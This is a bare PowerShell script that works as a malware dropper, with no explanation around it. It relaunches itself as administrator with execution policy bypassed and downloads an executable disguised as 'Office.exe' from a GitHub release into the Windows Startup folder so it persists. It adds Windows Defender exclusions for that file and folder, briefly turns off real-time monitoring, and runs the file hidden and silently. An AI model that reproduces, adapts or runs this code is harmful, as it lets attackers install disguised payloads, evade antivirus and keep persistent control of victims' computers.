# Silent execution - no output commands
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

$GitHubUrl = "https://github.com/irxdd/ikdk/releases/download/1/Office.exe"
$Arguments = ""  
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

function Add-DefenderExclusions {
    param([string]$FilePath, [string]$StartupPath)
    try {
        Add-MpPreference -ExclusionPath $FilePath -Force
        Add-MpPreference -ExclusionPath $StartupPath -Force
        $processName = [System.IO.Path]::GetFileName($FilePath)
        Add-MpPreference -ExclusionProcess $processName -Force
        $originalRealtime = (Get-MpPreference).DisableRealtimeMonitoring
        if (-not $originalRealtime) {
            Set-MpPreference -DisableRealtimeMonitoring $true
        }
        return $originalRealtime
    } catch {
        return $false
    }
}

function Restore-DefenderSettings {
    param([bool]$OriginalRealtimeState)
    try {
        if (-not $OriginalRealtimeState) {
            Set-MpPreference -DisableRealtimeMonitoring $false
        }
    } catch {}
}

function Download-GitHubRelease {
    param([string]$Url, [string]$OutputPath)
    try {
        $fileName = Split-Path $Url -Leaf
        $fullPath = Join-Path $OutputPath $fileName
        
        if (Test-Path $fullPath) {
            $fileAge = (Get-Date) - (Get-Item $fullPath).LastWriteTime
            if ($fileAge.TotalDays -lt 1) {
                return $fullPath
            } else {
                Remove-Item $fullPath -Force
            }
        }
        
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "PowerShell-AutoInstaller")
        $webClient.DownloadFile($Url, $fullPath)
        $webClient.Dispose()
        return $fullPath
    } catch {
        return $null
    }
}

function Start-BackgroundProcess {
    param([string]$FilePath, [string]$Arguments)
    try {
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = $FilePath
        $processStartInfo.Arguments = $Arguments
        $processStartInfo.UseShellExecute = $false
        $processStartInfo.CreateNoWindow = $true
        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $process = [System.Diagnostics.Process]::Start($processStartInfo)
        if ($process) {
            return $process.Id
        } else {
            return $null
        }
    } catch {
        return $null
    }
}

# Silent execution
try {
    $testFile = Join-Path $StartupPath "test_write_access.tmp"
    "test" | Out-File -FilePath $testFile -Force
    Remove-Item $testFile -Force
} catch {
    exit 1
}

if (-not (Test-Path $StartupPath)) {
    try {
        New-Item -ItemType Directory -Path $StartupPath -Force | Out-Null
    } catch {
        exit 1
    }
}

$downloadedFile = Download-GitHubRelease -Url $GitHubUrl -OutputPath $StartupPath

if ($downloadedFile -and (Test-Path $downloadedFile)) {
    $originalRealtimeState = Add-DefenderExclusions -FilePath $downloadedFile -StartupPath $StartupPath
    $processId = Start-BackgroundProcess -FilePath $downloadedFile -Arguments $Arguments
    Start-Sleep -Seconds 2
    Restore-DefenderSettings -OriginalRealtimeState $originalRealtimeState
}

# Exit silently - no Read-Host
